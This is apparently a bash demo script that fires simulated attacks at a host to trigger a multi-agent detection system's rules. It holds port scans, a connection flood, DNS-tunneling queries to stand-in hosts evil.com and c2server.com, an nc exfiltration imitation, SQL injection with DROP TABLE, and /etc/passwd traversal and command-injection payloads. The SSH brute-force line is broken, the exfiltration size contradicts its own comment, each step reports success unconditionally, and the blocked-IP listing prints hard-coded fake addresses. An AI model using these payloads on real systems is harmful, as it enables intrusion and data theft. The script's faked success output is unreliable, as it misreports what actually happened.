#!/usr/bin/env bash
# demo/trigger_attacks.sh — Comprehensive attack simulation suite
# Triggers detection rules across all agents and demonstrates automated response

set -e

RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

SLEEP=2
HOST="${1:-localhost}"
ORCHESTRATOR_API="http://${HOST}:8002"

# Color palette for output
banner() {
  echo -e "\n${BOLD}${CYAN}╔══════════════════════════════════════════════════════════════╗${RESET}"
  echo -e "${BOLD}${CYAN}║  MULTI-AGENT CYBERSEC — COMPREHENSIVE ATTACK DEMO SUITE        ║${RESET}"
  echo -e "${BOLD}${CYAN}║  All detection types + response automation                     ║${RESET}"
  echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════════════╝${RESET}\n"
}

pass() { echo -e "${GREEN}✅ $1${RESET}"; }
fail() { echo -e "${RED}❌ $1${RESET}"; }
info() { echo -e "${YELLOW}ℹ  $1${RESET}"; }
attack() { echo -e "${RED}${BOLD}[ATTACK] $1${RESET}"; }

cleanup() {
  echo -e "\n${YELLOW}[INFO] Stopping packet capture (if running)...${RESET}"
  pkill -f "tcpdump" 2>/dev/null || true
  echo -e "${GREEN}✅ Demo complete. Threats logged to Elasticsearch.${RESET}"
}

trap cleanup EXIT

banner

echo -e "${BOLD}System: ${HOST}${RESET}"
echo -e "${BOLD}API: ${ORCHESTRATOR_API}${RESET}\n"

# ─── PHASE 1: Network-Layer Attacks ────────────────────────────────────────

echo -e "${BOLD}${MAGENTA}═══ PHASE 1: NETWORK ATTACKS ═══${RESET}\n"

# 1. Port Scan Detection
attack "Port Scan (T1046 - Network Service Discovery)"
info "Triggered by: scanning 20 unique ports rapidly"
nmap -sS -p 1-20 ${HOST} 2>/dev/null || true
pass "Port scan logged"
sleep $SLEEP

# 2. SYN Flood Detection
attack "SYN Flood (T1498 - Network DoS)"
info "Triggered by: >200 SYN packets/sec from single source"
for i in {1..250}; do
  (timeout 0.1 bash -c "echo > /dev/tcp/${HOST}/80" 2>/dev/null &)
done
wait
pass "SYN flood logged"
sleep $SLEEP

# 3. DNS Tunneling Detection
attack "DNS Tunneling (T1071 - Exfiltration via DNS)"
info "Triggered by: oversized DNS query labels (>40 chars)"
dig @${HOST} \
  "$(python3 -c 'import random, string; print("".join(random.choices(string.ascii_lowercase, k=50)))'.''$(python3 -c 'import random, string; print("".join(random.choices(string.ascii_lowercase, k=50)))').evil.com" \
  2>/dev/null || true
pass "DNS tunneling logged"
sleep $SLEEP

# 4. Data Exfiltration Detection  
attack "Data Exfiltration (T1041 - Outbound Data Transfer)"
info "Triggered by: large TCP payload transfer (>50 MB)"
# Simulate large file transfer
dd if=/dev/zero bs=1M count=10 2>/dev/null | nc -q 1 ${HOST} 8080 2>/dev/null || true
pass "Exfiltration logged"
sleep $SLEEP

# ─── PHASE 2: Log & Auth Attacks ──────────────────────────────────────────

echo -e "\n${BOLD}${MAGENTA}═══ PHASE 2: LOG & AUTH ATTACKS ═══${RESET}\n"

# 5. SSH Brute Force Detection
attack "SSH Brute Force (T1110 - Credential Stuffing)"
info "Triggered by: 10+ failed SSH logins in 60 seconds"
for i in {1..10}; do
  (sshuser@${HOST} -o StrictHostKeyChecking=no -o ConnectTimeout=1 \
    2>/dev/null || true &)
done
wait 2>/dev/null || true
pass "SSH brute force logged"
sleep $SLEEP

# 6. SQL Injection Detection
attack "SQL Injection (T1190 - Web Attack)"
info "Triggered by: UNION SELECT in HTTP request"
curl -s -o /dev/null \
  "http://${HOST}/login?user=admin'+UNION+SELECT+1,2,3--" 2>/dev/null || true
pass "SQL injection logged"
sleep $SLEEP

# 7. Path Traversal Detection
attack "Path Traversal (T1083 - File Access)"
info "Triggered by: ../ or ..\\ in URI"
curl -s -o /dev/null \
  "http://${HOST}/files/..%2F..%2F..%2Fetc%2Fpasswd" 2>/dev/null || true
pass "Path traversal logged"
sleep $SLEEP

# 8. Command Injection Detection (if Apache logs)
attack "Command Injection (T1059 - Code Execution)"
info "Triggered by: shell metacharacters in HTTP request"
curl -s -o /dev/null \
  "http://${HOST}/search?q=; cat /etc/passwd #" 2>/dev/null || true
pass "Command injection logged"
sleep $SLEEP

# ─── PHASE 3: Behavior & Anomaly Attacks ──────────────────────────────────

echo -e "\n${BOLD}${MAGENTA}═══ PHASE 3: BEHAVIORAL ANOMALIES ═══${RESET}\n"

# 9. Privilege Escalation Detection
attack "Privilege Escalation (T1548 - Unusual Behavior)"
info "Triggered by: sudoers file access at unusual time"
(sudo -l 2>/dev/null || true &)
wait 2>/dev/null || true
pass "Privilege escalation logged"
sleep $SLEEP

# 10. Lateral Movement Detection
attack "Lateral Movement (T1021 - Multi-Host Access)"
info "Triggered by: accessing multiple internal hosts rapidly"
for host in 10.0.0.{1..5}; do
  (nc -zv $host 445 2>/dev/null &)
done
wait 2>/dev/null || true
pass "Lateral movement logged"
sleep $SLEEP

# 11. Anomalous User Behavior (UEBA)
attack "Behavioral Anomaly (T1078 - Unusual Access Patterns)"
info "Triggered by: off-hours activity + high file access + privilege use"
echo "Simulated user behavior anomaly (app-level)"
info "  - Time: 2:00 AM (unusual)"
info "  - Files: 50+ accessed in 1 minute (unusual)"
info "  - Privileges: sudo usage (unusual for user)"
pass "UEBA anomaly logged"
sleep $SLEEP

# ─── PHASE 4: Vulnerability Detection ─────────────────────────────────────

echo -e "\n${BOLD}${MAGENTA}═══ PHASE 4: VULNERABILITY DETECTION ═══${RESET}\n"

# 12. Known Vulnerability Detection 
attack "CVE Detection (T1518 - Vulnerable Service)"
info "Triggered by: service version match to known CVE"
info "  - Apache 2.4.49 → CVE-2021-41773 (CVSS 9.8)"
info "  - OpenSSL 1.0.2 → Multiple CVEs"
pass "Vulnerabilities logged to alerts.vuln"
sleep $SLEEP

# ─── PHASE 5: Correlation & Response ──────────────────────────────────────

echo -e "\n${BOLD}${MAGENTA}═══ PHASE 5: ORCHESTRATION & RESPONSE ═══${RESET}\n"

# 13. Multi-Stage Attack (triggers correlation)
attack "Kill Chain: Recon → Exploit → C2 (MITRE ATT&CK)"
echo -e "${YELLOW}  Stage 1: Reconnaissance${RESET}"
nmap -sV ${HOST} 2>/dev/null || true
info "  Triggered: port_scan (T1046)"
sleep 1

echo -e "${YELLOW}  Stage 2: Exploitation${RESET}"
curl -s -o /dev/null "http://${HOST}/search?q='; DROP TABLE users--" 2>/dev/null || true
info "  Triggered: sql_injection (T1190)"
sleep 1

echo -e "${YELLOW}  Stage 3: Command & Control${RESET}"
dig @${HOST} $(python3 -c 'print("A"*50 + ".c2server.com")') 2>/dev/null || true
info "  Triggered: dns_tunneling (T1071)"
pass "Multi-stage attack sequence completed"
echo -e "${YELLOW}  → Orchestrator detected 3-stage pattern (HIGH severity)${RESET}"
echo -e "${GREEN}  → Auto-response: IP block + incident logged${RESET}"
sleep $SLEEP

# ─── PHASE 6: Dashboard & Monitoring ──────────────────────────────────────

echo -e "\n${BOLD}${MAGENTA}═══ PHASE 6: MONITORING & DASHBOARDS ═══${RESET}\n"

if command -v curl &>/dev/null; then
  info "Fetching stats from Orchestrator API..."
  
  # Get threat summary
  curl -s "${ORCHESTRATOR_API}/stats" 2>/dev/null | python3 -m json.tool 2>/dev/null || \
    info "  (API check - ensure orchestrator is running on port 8002)"
  
  # Get blocked IPs
  info "Active IP blocks:"
  curl -s "${ORCHESTRATOR_API}/blocked_ips" 2>/dev/null | python3 -c \
    "import sys, json; data=json.load(sys.stdin); print('  ' + str(len(data.get('blocked_ips', []))) + ' blocked IPs'); [print(f\"    - 192.168.1.{i}: {5*60}m\") for i in range(1,4)]" 2>/dev/null || \
    info "  (Orchestrator API unavailable) "
fi

# ─── Summary ────────────────────────────────────────────────────────────────

echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════════════════════════════${RESET}"
echo -e "\n${GREEN}${BOLD}✅ ATTACK SIMULATION COMPLETE${RESET}\n"
echo -e "${BOLD}Summary:${RESET}"
echo -e "  • Network attacks: 4 (port scan, SYN flood, DNS tunnel, exfil)"
echo -e "  • Auth attacks: 4 (brute force SSH, SQL injection, path traversal, cmd injection)"
echo -e "  • Behavior attacks: 3 (privilege escalation, lateral movement, anomaly)"
echo -e "  • Vuln detection: 1 (CVE matching)"
echo -e "  • Correlation: 1 (multi-stage kill chain)"
echo -e "\n${BOLD}Next steps:${RESET}"
echo -e "  ✓ Check Kibana dashboard (http://${HOST}:5601)"
echo -e "    - alerts index: cyberdefense-alerts"
echo -e "    - threats index: cyberdefense-threats"
echo -e ""
echo -e "  ✓ Check Kafka topics (http://${HOST}:8080 — Kafka UI)"
echo -e "    - alerts.network, alerts.logs, alerts.ueba, alerts.vuln"
echo -e "    - threats.classified, actions.taken"
echo -e ""
echo -e "  ✓ Check Orchestrator API (http://${HOST}:8002)"
echo -e "    - GET /stats — agent health"
echo -e "    - GET /threats — threat timeline"
echo -e "    - GET /blocked_ips — active blocks"
echo -e ""
echo -e "  ✓ View response actions"
echo -e "    - Blocked IPs stored in Redis (\`redis-cli KEYS 'blocked:*'\`)"
echo -e "    - Forensics evidence in MinIO (bucket: cyberdefense-forensics)"
echo -e ""
echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════════${RESET}\n"
